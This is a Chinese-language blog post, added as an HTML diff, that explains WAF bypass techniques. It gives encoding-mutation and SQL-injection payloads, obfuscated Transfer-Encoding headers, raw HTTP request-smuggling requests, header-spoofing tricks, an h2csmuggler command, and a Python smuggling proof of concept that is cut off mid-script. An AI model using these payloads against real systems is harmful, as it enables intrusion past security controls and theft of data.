@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WAF 绕过：从编码变异到协议走私全拆解 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>WAF 绕过：从编码变异到协议走私全拆解</h1>
+<time>2026-08-05</time>
+<ul>
+<li>技术
+Slug: waf绕过-从编码变异到协议走私全拆解</li>
+</ul>
+<hr />
+<h2>一、WAF 工作原理与架构矛盾</h2>
+<h3>1.1 WAF 的定位</h3>
+<p>WAF（Web Application Firewall）本质上是部署在第七层的反向代理。它不是简单的四层包过滤设备，而是要"读懂"HTTP 语义：请求行、HTTP 头、查询参数、Cookie、请求体，甚至 multipart 分块与 JSON 结构。WAF 必须先解析，再检测，最后转发——这与后端应用服务器做的事情高度重叠。</p>
+<h3>1.2 请求处理流水线</h3>
+<p>一次请求从进入 WAF 到放行/拦截，通常经过如下流水线：</p>
+<div class="highlight"><pre><span></span><code><span class="c">        </span><span class="nb">+-----------+</span><span class="c">      </span><span class="nb">+----------+</span><span class="c">      </span><span class="nb">+----------+</span>
+<span class="c">client  |  SSL/TLS  |</span><span class="nb">-----</span><span class="nv">&gt;</span><span class="c">|  黑名单   |</span><span class="nb">-----</span><span class="nv">&gt;</span><span class="c">| 惩罚盒   |</span>
+<span class="c">request |  终结/卸载 |      |  快速检查 |      | (限速计数)|</span>
+<span class="c">        </span><span class="nb">+-----------+</span><span class="c">      </span><span class="nb">+----------+</span><span class="c">      </span><span class="nb">+----------+</span>
+<span class="c">                                                 |</span>
+<span class="c">                                                 v</span>
+<span class="c">        </span><span class="nb">+-----------+</span><span class="c">      </span><span class="nb">+----------+</span><span class="c">      </span><span class="nb">+----------+</span>
+<span class="c">        |  决策执行  |</span><span class="nv">&lt;</span><span class="nb">-----</span><span class="c">| 解析与检测|</span><span class="nv">&lt;</span><span class="nb">-----</span><span class="c">| 客户端   |</span>
+<span class="c">        | 放行/拦截  |      | 正则</span><span class="nb">+</span><span class="c">评分 |      | 信誉库   |</span>
+<span class="c">        </span><span class="nb">+-----------+</span><span class="c">      </span><span class="nb">+----------+</span><span class="c">      </span><span class="nb">+----------+</span>
+<span class="c">              |</span>
+<span class="c">              v</span>
+<span class="c">        </span><span class="nb">+-----------+</span>
+<span class="c">        |  后端应用  |</span>
+<span class="c">        | (独立解析器)|</span>
+<span class="c">        </span><span class="nb">+-----------+</span>
+</code></pre></div>
+
+<p>完整链路为：<strong>黑名单检查 → 惩罚盒 → 速率控制 → 客户端信誉 → 解析与检测 → 决策</strong>。其中前几步是基于 IP/UA/签名的粗粒度过滤，真正决定 payload 是否过审的是"解析与检测"阶段。</p>
+<h3>1.3 三种检测模型</h3>
+<p>WAF 的检测引擎通常组合三种模型：</p>
+<ol>
+<li><strong>签名检测（Signature）</strong>：基于正则或字符串匹配，命中即拦截。例如匹配 <code>union\s+select</code>、<code>&lt;script&gt;</code>。速度快但极易被变形绕过。</li>
+<li><strong>异常评分（Anomaly Scoring）</strong>：对每条可疑特征赋分，累计超过阈值才拦截。例如单条 <code>%3C</code> 得 2 分，<code>&lt;script&gt;</code> 得 5 分，阈值 5。抗噪能力强但反应慢。</li>
+<li><strong>自定义规则（Custom Rules）</strong>：业务侧定义的精确策略，如限制某接口只接受数字参数。</li>
+</ol>
+<h3>1.4 核心架构矛盾</h3>
+<p>这是理解所有绕过技术的根本前提：</p>
+<div class="highlight"><pre><span></span><code><span class="c">        </span><span class="nb">+-------------------+</span><span class="c">        </span><span class="nb">+-------------------+</span>
+<span class="c">字节流 </span><span class="nb">--</span><span class="nv">&gt;</span><span class="c">|   WAF HTTP 解析器  |</span><span class="nb">--</span><span class="c">转发</span><span class="nb">--</span><span class="nv">&gt;</span><span class="c">|  后端 HTTP 解析器  |</span><span class="nb">--</span><span class="nv">&gt;</span><span class="c"> 应用逻辑</span>
+<span class="c">        </span><span class="nb">+-------------------+</span><span class="c">        </span><span class="nb">+-------------------+</span>
+<span class="c">              解释 A                        解释 B</span>
+<span class="c">                    \                      /</span>
+<span class="c">                     \    当 A != B 时    /</span>
+<span class="c">                      \</span><span class="nb">----</span><span class="nv">&gt;</span><span class="c"> 绕过空间 </span><span class="nb">----</span><span class="c">/</span>
+</code></pre></div>
+
+<p><strong>WAF 不是后端的透明代理。</strong> WAF 是一套独立的 HTTP 解析器，后端是另一套解析器。两套解析器对同一段字节流给出不同解释——这就是所有 payload 构造的根本依据。WAF 看到的是"安全请求"，后端看到的是"攻击请求"，绕过就发生了。</p>
+<h3>1.5 主流 WAF 请求体检测大小限制</h3>
+<p>WAF 为了性能，对请求体只检查前 N 字节。超出部分直接放行，这本身就是绕过面：</p>
+<table>
+<thead>
+<tr>
+<th>WAF</th>
+<th>最大检测大小</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cloudflare</td>
+<td>128 KB</td>
+</tr>
+<tr>
+<td>AWS WAF</td>
+<td>8KB-64KB</td>
+</tr>
+<tr>
+<td>Azure WAF</td>
+<td>128KB-2MB</td>
+</tr>
+<tr>
+<td>Google Cloud Armor</td>
+<td>8KB-64KB</td>
+</tr>
+</tbody>
+</table>
+<p>超过阈值的部分等于"盲区"，攻击者用大量无害填充把真实 payload 推到检测窗口之外即可。</p>
+<h2>二、编码变异绕过手法</h2>
+<p>编码变异的核心思路：WAF 的正则按"标准编码"写，后端解码后还原出原始 payload。两者对同一字节串的语义解释再次分裂。</p>
+<h3>2.1 URL 编码</h3>
+<div class="highlight"><pre><span></span><code>单次：&lt; → %3C, &gt; → %3E, &lt;script&gt; → %3Cscript%3E
+双重：&lt; → %3C → %253C
+union select → %2575%256E%2569%256F%256E%20%2573%2565%256C%2565%2563%2574
+</code></pre></div>
+
+<p>WAF 通常只解一层 URL 编码，后端的 web 框架可能再解一层。实测绕过率：单次约 52%，双重约 71%。差异来自"WAF 解几层"与"后端解几层"不对齐。</p>
+<h3>2.2 Unicode 编码变异</h3>
+<p>不同上下文有不同的 Unicode 转义形式，WAF 难以穷举：</p>
+<div class="highlight"><pre><span></span><code>JS Unicode转义：\u003cscript\u003e
+JS Hex转义：\x3cscript\x3e
+JSON Unicode：\u0022（双引号）
+CSS Hex：\00003c
+UTF-16：可能导致 XXE 检测绕过
+</code></pre></div>
+
+<p>关键是上下文决定哪种转义有效：JS 引擎吃 <code>\uXXXX</code>，JSON 解析器吃 <code>\uXXXX</code>，CSS 吃 <code>\XXXXXX</code>。WAF 若只对原始字符串做正则，所有转义形式都会漏过。</p>
+<h3>2.3 HTML 实体编码</h3>
+<div class="highlight"><pre><span></span><code>&quot; → &amp;quot; 或 &amp;#34; 或 &amp;#x22;
+&lt; → &amp;lt; 或 &amp;#60; 或 &amp;#x3C;
+</code></pre></div>
+
+<p>绕过率约 65%。命中的前提是 payload 最终落在会被浏览器渲染 HTML 的输出点。WAF 看到的是实体串，浏览器渲染时还原成 <code>&lt;</code>。</p>
+<h3>2.4 空白字符替换</h3>
+<p>SQL/命令注入的正则常用 <code>\s</code> 或空格分隔关键词。用非标准空白符替代即可绕过：</p>
+<div class="highlight"><pre><span></span><code><span class="o">%</span><span class="mi">09</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">水平制表符</span><span class="p">(</span><span class="n">HT</span><span class="p">)</span>
+<span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">换行符</span><span class="p">(</span><span class="n">LF</span><span class="p">)</span>
+<span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">回车符</span><span class="p">(</span><span class="n">CR</span><span class="p">)</span>
+<span class="o">%</span><span class="mi">0</span><span class="n">b</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">垂直制表符</span><span class="p">(</span><span class="n">VT</span><span class="p">)</span>
+<span class="nf">%a0</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">不间断空格</span><span class="p">(</span><span class="n">NBSP</span><span class="p">)</span>
+</code></pre></div>
+
+<p>例如 <code>UNION%0aSELECT</code> 在很多 WAF 签名下不命中 <code>union\s+select</code>，但 MySQL 仍按空白解析。</p>
+<h3>2.5 混合编码</h3>
+<ul>
+<li>大小写混合：<code>sElEcT</code>, <code>UnIoN</code>, <code>&lt;ScRiPt&gt;</code> —— 正则若未加 <code>(?i)</code> 标志直接失效。</li>
+<li>注释注入：<code>UN/**/ION SE/**/LECT 1,2,3</code> —— 利用 SQL 内联注释打断关键词连续性，WAF 正则看到的是被注释切断的片段，数据库引擎却会剔除注释重新拼合。</li>
+</ul>
+<h2>三、解析差异矩阵</h2>
+<p>编码变异只在"内容层"做文章，真正致命的是"协议层"的解析差异。WAF 与后端对同一个 HTTP 头给出不同取值，攻击者借此让双方读到不同的请求边界。</p>
+<h3>3.1 Transfer-Encoding 头解析差异</h3>
+<p><code>Transfer-Encoding</code> 决定请求体如何分块。当头部写法不规范时，各服务器取值策略分叉：</p>
+<table>
+<thead>
+<tr>
+<th>服务器</th>
+<th>Token顺序</th>
+<th>重复头</th>
+<th>未知Token</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache httpd</td>
+<td>最后一个生效</td>
+<td>合并，最后生效</td>
+<td>忽略(视为identity)</td>
+</tr>
+<tr>
+<td>Nginx</td>
+<td>第一个生效</td>
+<td>第一个生效</td>
+<td>拒绝(400)</td>
+</tr>
+<tr>
+<td>IIS 10</td>
+<td>最后一个生效</td>
+<td>合并，第一个生效</td>
+<td>接受但剥离</td>
+</tr>
+<tr>
+<td>Traefik</td>
+<td>第一个生效</td>
+<td>第一个生效</td>
+<td>静默接受</td>
+</tr>
+</tbody>
+</table>
+<p>下面这张对比图直观展示分歧点：</p>
+<div class="highlight"><pre><span></span><code><span class="c">   请求头: Transfer</span><span class="nb">-</span><span class="c">Encoding: chunked</span><span class="nt">,</span><span class="c"> gzip</span>
+<span class="c">   </span><span class="nb">-----------------------------------------------------------------</span>
+<span class="c">                |  取谁生效?          |  最终按什么解析 body?</span>
+<span class="c">   </span><span class="nb">-----------------------------------------------------------------</span>
+<span class="c">   Nginx        |  第一个 (chunked)   |  分块传输</span>
+<span class="c">   Apache httpd |  最后一个 (gzip)    |  gzip 压缩流(非分块)</span>
+<span class="c">   IIS 10       |  最后一个 (gzip)    |  接受但剥离 → identity</span>
+<span class="c">   </span><span class="nb">-----------------------------------------------------------------</span>
+<span class="c">                       关键矛盾：同一字节流，四种解释</span>
+</code></pre></div>
+
+<p>关键矛盾：发送 <code>Transfer-Encoding: chunked, gzip</code> 时，Nginx 取第一个（chunked，按分块解析），Apache 取最后一个（gzip，按压缩流解析）。前端与后端若分属这两类，请求边界就错位了。</p>
+<h3>3.2 TE 头混淆变体</h3>
+<p>攻击者通过污染 TE 头的字节细节，让一方认为它是合法 TE、另一方认为它不是 TE 而忽略：</p>
+<div class="highlight"><pre><span></span><code><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">xchunked</span>
+<span class="n">Transfer</span><span class="o">-</span><span class="n">Encoding</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">chunked</span>
+<span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="o">[</span><span class="n">tab</span><span class="o">]</span><span class="n">chunked</span>
+<span class="o">[</span><span class="n">space</span><span class="o">]</span><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">chunked</span>
+<span class="nl">X</span><span class="p">:</span><span class="w"> </span><span class="n">X</span><span class="o">[</span><span class="n">\n</span><span class="o">]</span><span class="n">Transfer</span><span class="o">-</span><span class="nl">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">chunked</span>
+</code></pre></div>
+
+<p>这些变体利用了"冒号前后空格""头名前导空格""行内注入换行"等解析差异。WAF 的正则若严格匹配 <code>^Transfer-Encoding:\s*chunked$</code>，几乎所有变体都漏检。</p>
+<h3>3.3 Multipart boundary 解析差异</h3>
+<p>multipart 的 <code>boundary</code> 参数同样存在取值分歧：</p>
+<div class="highlight"><pre><span></span><code><span class="nt">Content-Type</span><span class="o">:</span><span class="w"> </span><span class="nt">multipart</span><span class="o">/</span><span class="nt">form-data</span><span class="o">;</span><span class="w"> </span><span class="nt">boundary</span><span class="o">=</span><span class="s2">&quot;----Boundary; boundary=legit&quot;</span>
+</code></pre></div>
+
+<p>WAF 取第二个参数（legit）作为分界，后端则把两个值拼起来。于是 WAF 按 <code>legit</code> 切分看到无害片段，后端按拼接值切分还原出完整攻击 payload。WAFFLED 论文确认了 1207 个此类绕过实例。</p>
+<p>真实 CVE：<strong>CVE-2026-26961</strong>（Rack 贪婪式 multipart boundary 解析）—— Rack 在解析 boundary 时贪婪匹配，导致与上游代理对分块边界的认知不一致。</p>
+<h2>四、HTTP 请求走私</h2>
+<p>请求走私（Request Smuggling）是解析差异的极致利用：让前端与后端对"请求在哪里结束"判断不一致，把走私请求"夹带"进下一个受害者的连接里。</p>
+<h3>4.1 走私原理时序图</h3>
+<div class="highlight"><pre><span></span><code><span class="w">   </span><span class="err">前端</span><span class="p">(</span><span class="err">代理</span><span class="p">)</span><span class="w">                         </span><span class="err">后端</span><span class="p">(</span><span class="err">应用</span><span class="p">)</span>
+<span class="w">      </span><span class="o">|</span><span class="w">                                  </span><span class="o">|</span>
+<span class="w">      </span><span class="o">|--</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="n">CL</span><span class="o">:</span><span class="mi">13</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">TE</span><span class="o">:</span><span class="n">chunked</span><span class="w"> </span><span class="o">--&gt;|</span><span class="w">  </span><span class="err">前端按</span><span class="n">CL读到</span><span class="s">&quot;0\r\n\r\nSMUGGLED&quot;</span><span class="err">结束</span>
+<span class="w">      </span><span class="o">|</span><span class="w">   </span><span class="n">body</span><span class="o">:</span><span class="w"> </span><span class="mi">0</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">nSMUGGLED</span><span class="w">        </span><span class="o">|</span><span class="w">  </span><span class="err">后端按</span><span class="n">TE读到</span><span class="s">&quot;0\r\n\r\n&quot;</span><span class="err">结束</span>
+<span class="w">      </span><span class="o">|</span><span class="w">                                  </span><span class="o">|</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="s">&quot;SMUGGLED&quot;</span><span class="w"> </span><span class="err">残留在连接缓冲区</span>
+<span class="w">      </span><span class="o">|</span><span class="w">                                  </span><span class="o">|</span>
+<span class="w">      </span><span class="o">|</span><span class="w">                                  </span><span class="o">|</span><span class="w">  </span><span class="p">(</span><span class="err">下一个受害者请求进来</span><span class="p">)</span>
+<span class="w">      </span><span class="o">|----</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="o">---------&gt;|</span><span class="w">  </span><span class="err">后端</span><span class="o">:</span><span class="w"> </span><span class="s">&quot;SMUGGLED&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;GET /home&quot;</span>
+<span class="w">      </span><span class="o">|</span><span class="w">                                  </span><span class="o">|</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">SMUGGLED</span><span class="w"> </span><span class="err">被当作新请求处理</span>
+<span class="w">      </span><span class="o">|&lt;---</span><span class="w"> </span><span class="err">走私请求的响应</span><span class="w"> </span><span class="o">---------------|</span>
+<span class="w">      </span><span class="o">|</span><span class="w">                                  </span><span class="o">|</span>
+</code></pre></div>
+
+<p>核心：前端认为"请求A到此结束"，后端认为"请求A更早结束"，残留字节被拼到下一个请求前面。</p>
+<h3>4.2 CL.TE 走私</h3>
+<p>前端用 <code>Content-Length</code>，后端用 <code>Transfer-Encoding</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable-website.com</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">13</span>
+<span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+
+0
+
+SMUGGLED
+</code></pre></div>
+
+<p>前端按 CL 读完 13 字节（<code>0\r\n\r\nSMUGGLED</code>），后端按 TE 在 <code>0\r\n\r\n</code> 处认为分块结束，<code>SMUGGLED</code> 残留。</p>
+<h3>4.3 TE.CL 走私</h3>
+<p>前端用 TE，后端用 CL：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable-website.com</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">3</span>
+<span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+
+8
+SMUGGLED
+0
+</code></pre></div>
+
+<p>前端按 TE 读完整分块（<code>8\r\nSMUGGLED\r\n0\r\n\r\n</code>），后端按 CL 只读 3 字节，剩余 <code>SMUGGLED</code> 残留到下个请求。</p>
+<h3>4.4 TE.TE 走私（混淆 TE 头）</h3>
+<p>通过混淆 TE 头使一方忽略它、另一方接受它。大小写混合可绕过 ModSecurity 规则 941110：</p>
+<div class="highlight"><pre><span></span><code>Transfer-Encoding: ChUnKeD ,    GzIp
+</code></pre></div>
+
+<p>ModSecurity 的正则对 <code>chunked</code> 大小写敏感，<code>ChUnKeD</code> 不命中；而后端服务器做大小写不敏感匹配，仍按分块处理。差异即走私。</p>
+<h3>4.5 CL.CL 走私</h3>
+<p>发送两个不同的 <code>Content-Length</code> 头：</p>
+<div class="highlight"><pre><span></span><code>Content-Length: 3
+Content-Length: 100
+</code></pre></div>
+
+<p>前端取第一个、后端取第二个（或反之），读取边界不一致即可夹带。</p>
+<h3>4.6 CL.0 走私</h3>
+<p>发送 <code>Content-Length: 0</code> 但实际附带 body：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">vulnerable-website.com</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
+
+SMUGGLED
+</code></pre></div>
+
+<p>若前端拒绝再读（认为 body 为空），后端却信任实际字节流，残留即发生。</p>
+<h3>4.7 分块扩展走私（2025 新技术）</h3>
+<p>HTTP 分块允许在大小行后写扩展字段（<code>;ext</code>）。前端忽略畸形扩展、视为单个请求，后端把扩展当作分块终止，于是后续字节被解释为新请求：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
+<span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+
+5;
+0
+
+GET /admin HTTP/1.1
+Host: internal
+</code></pre></div>
+
+<p>前端忽略 <code>5;</code> 的畸形扩展视为一个请求，后端将 <code>GET /admin</code> 解释为新请求，从而走私到内网。</p>
+<h2>五、协议走私链构造</h2>
+<p>单个走私点已经够危险，更可怕的是把多个不同步点串成"链"，让检测在每一层都失效。</p>
+<h3>5.1 协议走私链全景图</h3>
+<div class="highlight"><pre><span></span><code><span class="w">   </span><span class="err">攻击者</span>
+<span class="w">     </span><span class="o">|</span>
+<span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">2</span><span class="w"> </span><span class="err">请求</span>
+<span class="w">     </span><span class="n">v</span>
+<span class="o">+------------------+</span><span class="w">      </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">2</span><span class="w"> </span><span class="err">帧长度</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">前端唯一边界依据</span>
+<span class="o">|</span><span class="w">  </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">2</span><span class="w"> </span><span class="err">前端</span><span class="w">      </span><span class="o">|</span><span class="w">      </span><span class="err">不剥离</span><span class="w"> </span><span class="n">TE</span><span class="o">/</span><span class="n">CL</span><span class="p">,</span><span class="w"> </span><span class="err">降级翻译为</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="o">|</span><span class="w">  </span><span class="p">(</span><span class="n">ALB</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">CDN</span><span class="p">)</span><span class="w">     </span><span class="o">|</span>
+<span class="o">+------------------+</span>
+<span class="w">     </span><span class="o">|</span>
+<span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="err">翻译后的</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="err">流</span><span class="w">  </span><span class="p">(</span><span class="err">带</span><span class="w"> </span><span class="n">TE</span><span class="o">:</span><span class="w"> </span><span class="n">chunked</span><span class="w"> </span><span class="err">或</span><span class="w"> </span><span class="n">CL</span><span class="p">)</span>
+<span class="w">     </span><span class="n">v</span>
+<span class="o">+------------------+</span><span class="w">      </span><span class="err">后端按</span><span class="w"> </span><span class="n">TE</span><span class="w"> </span><span class="err">或</span><span class="w"> </span><span class="n">CL</span><span class="w"> </span><span class="err">二次切分</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">边界再次偏移</span>
+<span class="o">|</span><span class="w">  </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="err">后端</span><span class="w">    </span><span class="o">|</span>
+<span class="o">|</span><span class="w">  </span><span class="p">(</span><span class="n">mod_proxy</span><span class="w"> </span><span class="err">等</span><span class="p">)</span><span class="w">  </span><span class="o">|</span>
+<span class="o">+------------------+</span>
+<span class="w">     </span><span class="o">|</span>
+<span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="err">走私请求到达内网</span><span class="w"> </span><span class="o">/</span><span class="n">admin</span>
+<span class="w">     </span><span class="n">v</span>
+<span class="w">   </span><span class="err">受保护资源</span>
+</code></pre></div>
+
+<p>链的本质：每一跳都是一次"边界翻译"，每次翻译都可能引入新的不同步点。</p>
+<h3>5.2 HTTP/2 降级走私</h3>
+<p>HTTP/2 用帧长度界定请求边界，没有文本协议的 CL/TE 歧义。但当前端把 HTTP/2 降级翻译成 HTTP/1.1 时，若未正确处理 TE/CL 头，就会重新引入走私面：</p>
+<table>
+<thead>
+<tr>
+<th>变体</th>
+<th>前端长度依据</th>
+<th>后端长度依据</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>H2.TE</td>
+<td>HTTP/2 帧长度</td>
+<td>Transfer-Encoding: chunked</td>
+</tr>
+<tr>
+<td>H2.CL</td>
+<td>HTTP/2 帧长度</td>
+<td>Content-Length</td>
+</tr>
+</tbody>
+</table>
+<p>真实案例：AWS ALB 在降级时未剥离 TE 头。James Kettle 利用 H2.TE 攻击 Verizon 执法访问门户——ALB 按帧长度转发，后端按 <code>Transfer-Encoding: chunked</code> 解析，二者错位即走私。</p>
+<h3>5.3 h2c 走私（明文升级）</h3>
+<p>HTTP/1.1 的 <code>Upgrade: h2c</code> 握手可让明文连接升级为 HTTP/2。若前端代理允许升级却不理解升级后的二进制帧，攻击者可在升级后的隧道里夹带任意 HTTP/1.1 请求：</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>h2csmuggler.py<span class="w"> </span>-u<span class="w"> </span>https://target<span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;GET /admin HTTP/1.1\r\nHost: target\r\n\r\n&#39;</span>
+</code></pre></div>
+
+<p>前端只看到一次合法的 Upgrade 握手，后续走私请求全部走"看不见"的 h2c 隧道直达后端。</p>
+<h3>5.4 双重 Desync 链（TE.TE + CL.TE）</h3>
+<p>把两个独立的不同步点串联：第一层用 TE.TE 混淆让前端与中间件对分块认知错位，第二层再用 CL.TE 让中间件与后端对边界再次错位。两层错位叠加后，任何单点检测都无法还原完整语义，定位极难。</p>
+<h3>5.5 WebSocket 升级走私</h3>
+<p>利用 <code>Upgrade: websocket</code> 握手处理差异：前端认为这是 WebSocket 升级、转入隧道模式，后端却仍按普通 HTTP 请求解析。隧道里夹带的字节被后端当成新 HTTP 请求执行，实现穿透 WAF 直达后端。</p>
+<h2>六、WAF 检测绕过技术</h2>
+<p>除了协议层走私，还有一类思路是直接"骗过" WAF 的检测窗口与逻辑。</p>
+<h3>6.1 分块传输绕过</h3>
+<p>把 payload 拆成单字符的分块，WAF 逐块检查永远凑不出完整签名：</p>
+<div class="highlight"><pre><span></span><code><span class="mf">2</span>
+<span class="n">id</span>
+<span class="mf">1</span>
+<span class="o">=</span>
+<span class="mf">1</span>
+<span class="mf">1</span>
+<span class="mf">0</span>
+</code></pre></div>
+
+<p>每个分块单独看都是无害片段，数据库引擎按分块协议重组后才得到 <code>id=1</code>。完整 SQLi payload 拆开后同理，WAF 的签名匹配在单块内永远不命中。</p>
+<h3>6.2 多部分表单绕过</h3>
+<p>把 payload 拆到多个 multipart part 里，每个 part 都是无害片段。WAF 逐个 part 检查看不到完整签名，后端应用却会把多个 part 拼接成完整逻辑。</p>
+<h3>6.3 请求体大小溢出绕过</h3>
+<p>利用第一节列出的检测大小上限（如 Cloudflare 128KB、AWS 8KB-64KB）。前置大量无害垃圾数据填充到超过阈值，把真实 payload 推到 WAF 检测窗口之外，WAF 截断后直接放行尾部。</p>
+<h3>6.4 参数污染</h3>
+<div class="highlight"><pre><span></span><code>?id=1&amp;id=UNION SELECT password FROM users
+</code></pre></div>
+
+<p>WAF 通常取第一个参数值 <code>id=1</code>（看似无害）检查通过，后端却可能取最后一个或拼接全部值，于是 <code>UNION SELECT</code> 被执行。前后端对"同名参数取值策略"不一致是根因。</p>
+<h3>6.5 基于信任的排除</h3>
+<p>WAF 常对"可信来源"跳过检测，攻击者伪装成可信源即可整体绕过：</p>
+<ul>
+<li><strong>直连源站</strong>：通过历史 DNS 记录、favicon hash、Shodan 等找到源站真实 IP，绕过 CDN 前置的 WAF。</li>
+<li><strong>头部伪造</strong>：伪造 <code>X-Forwarded-For: 127.0.0.1</code>，WAF 误判为内网可信调用而放行。</li>
+<li><strong>ASN 信任滥用</strong>：伪造来自可信云厂商 ASN 的请求，命中 WAF 的 ASN 白名单。</li>
+</ul>
+<h2>七、实际绕过 PoC</h2>
+<p>下面是一个 TE.TE 走私的 Python 原始报文 PoC。它同时发送 <code>Transfer-Encoding: chunked , gzip</code> 与 <code>Content-Length</code>，利用前端与后端对 TE 头取值策略的不同实现夹带。注意 <code>latin1</code> 编码避免多字节字符破坏字节级偏移。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="w"> </span><span class="nn">ssl</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;vulnerable.example&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">443</span>
+
+<span class="n">raw</span> <span class="o">=</span> <span class="p">(</span>
+  <span class="s2">&quot;POST /login HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;Host: </span><span class="si">{host}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;Transfer-Encoding: chunked , gzip</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;Content-Length: 52</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;b</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;username=admin&amp;pwd=pass</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="s2">&quot;0</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
+<span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">HOST</span><span class="p">)</span>
+
+<span class="n">ctx</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">()</span>
+<span class="k">with</span> <span class="n">ctx</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(),</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">HOST</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
